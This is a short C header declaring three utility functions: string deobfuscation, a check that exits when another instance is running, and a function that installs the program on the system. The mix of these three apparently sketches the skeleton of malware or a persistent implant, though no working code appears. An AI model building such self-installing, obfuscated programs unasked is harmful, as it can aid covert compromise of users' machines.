#ifndef SYSTEM_UTILS_H
#define SYSTEM_UTILS_H

/**
 * Deobfuscates strings
 *
 * Does its shit
 *
 * Returns - OK or ERROR
*/
char *decrypt_string(char *data, size_t len);

/**
 * Checks if its already running
 *
 * Checks for processes called NAME, if there are 2 or
 * more (you + 1) then we stop the program
 *
 * Returns - OK or ERROR
*/
int already_running();

/**
 * Install on the system
 *
 * Installs itself on the system
 *
 * Returns - OK or ERROR
*/
int install();

#endif